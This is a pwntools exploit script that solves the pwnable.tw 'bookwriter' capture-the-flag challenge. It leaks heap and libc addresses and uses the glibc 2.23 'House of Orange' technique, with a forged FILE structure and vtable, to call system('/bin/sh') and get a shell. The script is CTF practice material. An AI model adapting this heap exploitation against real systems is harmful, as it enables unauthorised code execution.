#!/usr/bin/env python3
from pwn import *

QWORD = 8
P_INUSE = 1
PAGE_SIZE = 0x1000
CHUNK_HDR_SIZE = QWORD * 2
DUMMY = 0xdeadbeefdeadbeef
PAD = lambda n: b"a" * n

ld = ELF("./ld-2.23.so")
elf = ELF("./bookwriter_patched")
libc = ELF("./given/libc_64.so.6")
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

if args.REMOTE:
    p = remote("chall.pwnable.tw", 10304)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        gdb.attach(p, "\n".join([
                "b *0x400d3d" # exit
            ]))
        log.info(f"bookpage[0~8]: 0x6020a0")


class HouseOfOrangeFilePtr:
    def __init__(self, io_list_all, vtable_addr):
        self.io_list_all = io_list_all
        self.vtable_addr = vtable_addr

    def dump(self):
        offset_map = {
                0x0: b"/bin/sh\x00",
                0x8: p64(0x61),
                0x18: p64(self.io_list_all - 0x10),
                0x20: p64(2), # FILE->_IO_write_base
                0x28: p64(3), # FILE->_IO_write_ptr
                0xc0: p64(0), # FILE->_mode
                0xd8: p64(self.vtable_addr)
                }
        payload = b""
        for i in range(0, 0xe0, QWORD):
            if i in offset_map:
                payload += offset_map[i]
            else:
                payload += p64(DUMMY)
        return payload

class FakeFileVtable:
    def __init__(self, name2val):
        name2offset = {"_IO_overflow": 0x18}
        self.offset_map = {}
        for name, val in name2val.items():
            offset = name2offset[name]
            self.offset_map[offset] = p64(val)

    def dump(self):
        payload = b""
        for i in range(0, 0xc0, QWORD):
            if i in self.offset_map:
                payload += self.offset_map[i]
            else:
                payload += p64(DUMMY)
        return payload


page_cnt = 0
def add_bookpage(size, data):
    global page_cnt
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Size of page :", str(size).encode())
    if data is None:
        return
    p.sendafter(b"Content :", data)
    index = page_cnt
    page_cnt += 1
    return index

def view_bookpage(index):
    assert(index <= 7)
    p.sendlineafter(b"Your choice :", b"2")
    p.sendlineafter(b"Index of page :", str(index).encode())
    p.recvuntil(b"Content :\n")
    leak = p.recvline()
    return leak

def edit_bookpage(index, data):
    p.sendlineafter(b"Your choice :", b"3")
    p.sendlineafter(b"Index of page :", str(index).encode())
    p.sendafter(b"Content:", data)

def view_info(new_author=b""):
    p.sendlineafter(b"Your choice :", b"4")
    p.recvuntil(b"Author : ")
    author = p.recvline()
    p.recvuntil(b"Page : ")
    num_page = p.recvline()
    if new_author:
        p.sendlineafter(b"Do you want to change the author ? (yes:1 / no:0)",
                        b"1")
        p.sendafter(b"Author :", new_author)
    else:
        p.sendlineafter(b"Do you want to change the author ? (yes:1 / no:0)",
                        b"0")
    return author, num_page

def leak_heap():
    # pad author buffer to full size
    view_info(PAD(0x40))
    # leak the first bookpage heap
    author, _ = view_info()
    heap_leak = author[0x40:-1]
    heap_addr = u64(heap_leak.ljust(8, b"\x00"))
    log.info(f"heap leak: {hex(heap_addr)}")
    return heap_addr

def leak_libc():
    unsorted_bin_chunk_size = 0x100
    p1_idx = add_bookpage(unsorted_bin_chunk_size, PAD(QWORD))
    leak = view_bookpage(p1_idx)[QWORD:]
    libc_leak = u64(leak.strip().ljust(QWORD, b"\x00"))
    log.info(f"libc leak: {hex(libc_leak)}")
    return libc_leak

def overflow_read_size_slot(allocated_bookpage):
    edit_bookpage(0, b"\x00")
    for _ in range(9 - allocated_bookpage):
        add_bookpage(0x30, p64(DUMMY))

def house_of_orange(size):
    """
    House of orange with the following differences from How2heap
        0) alignment must be {n * 16 + 8} so that we can overwrite the size field
        1) uses unsorted_bin->bck field to leak libc to get _IO_list_all
        2) uses scanf() to perform malloc(0x1000)
        3) other operations because we are not as free as how2heap script
    """
    # to overflow, must be 8-aligned chunk size
    # the following varaibles p0_usable_size, p0_chunk_size is ONLY true
    # under this assertion (i.e. size % 16 == 8)
    assert(size % 16 == 8)
    p0_usable_size = size
    p0_chunk_size = p0_usable_size + 8

    # This memory page layout will be:
    # | p0_hdr    |: 0x10
    # | p0_data   |: usable_size - 8
    # | pTop hdr  |: 0x10
    # | pTop data |: PAGE_SIZE - p0_hdr - p0_data - pTop_hdr
    p0_idx = add_bookpage(size, p64(DUMMY))
    pTop_chunk_size = (PAGE_SIZE - p0_chunk_size) | P_INUSE

    # first, pad bytes to full size, vulnerability will use strlen() to overwrite size
    edit_bookpage(p0_idx, PAD(size))
    edit_bookpage(p0_idx, PAD(p0_usable_size) + p64(pTop_chunk_size)[:3])

    # HOUSE_OF_ORANGE: Leak heap address while also call scanf() which internally call malloc(0x1000)
    p0_addr = leak_heap()

    # Uses unsorted_bin to leak libc
    libc.address = leak_libc() - 0x3c4158
    log.info(f"libc base: {hex(libc.address)}")

    # After next line, p0 can overwrite huge bytes
    overflow_read_size_slot(allocated_bookpage=2)

    # check unsorted_bin to update this addresss
    top_addr = p0_addr + 0x6d0 - 0x10
    log.info(f"top chunk address: {hex(top_addr)}")
    if args.D:
        return

    # HOUSE OF ORANGE PAYLOAD!!
    file_vtable_addr = p0_addr
    vt = FakeFileVtable({"_IO_overflow": libc.sym["system"]}).dump()
    fp = HouseOfOrangeFilePtr(libc.sym["_IO_list_all"], file_vtable_addr).dump()
    payload = vt.ljust(top_addr - p0_addr, b"a") + fp
    edit_bookpage(p0_idx, payload)

    # manage to malloc again
    edit_bookpage(p0_idx, b"\x00")
    add_bookpage(10, None)

def exploit():
    """
    All the leak, libc, operation should be done within house_of_orange operation
    House of orange has success rate around 70%
    We cannot get a shell but "sh: ..." msg in local exploit because the ld, libc versions are too old
    """
    p.sendlineafter(b"Author :", b"hello")
    house_of_orange(0x400 - 8)

    # exit: for debug purpose
    if args.D:
        # checkout "bin" to get the top_chunk address
        p.sendlineafter(b"Your choice :", b"5")

    p.interactive()

if __name__ == "__main__":
    exploit()

# NOTE:
# heap alignment:
# According to my observation
# malloc_usable_size() will always be {n * 0x10 + 8}
# chunk size will always be malloc_usable_size + 8
# | request size | malloc usable size | chunk size |
# +--------------+--------------------+------------+
# | 0x1 ~ 0x18   |        0x18        |   0x20     |
# | 0x19 ~ 0x28  |        0x28        |   0x30     |
# | 0x29 ~ 0x38  |        0x38        |   0x40     |
# |     ...      |        ...         |   ....     |
# The malloc usable size will overlap the next chunk->prev_size field.
#
# In this challenge, the requested size determines how much input we can read()
# and one of the vulnerability is to use next_chunk->size field.
# To do so, we must request the size to match usable size,
# i.e. {n * 0x10 + 8}

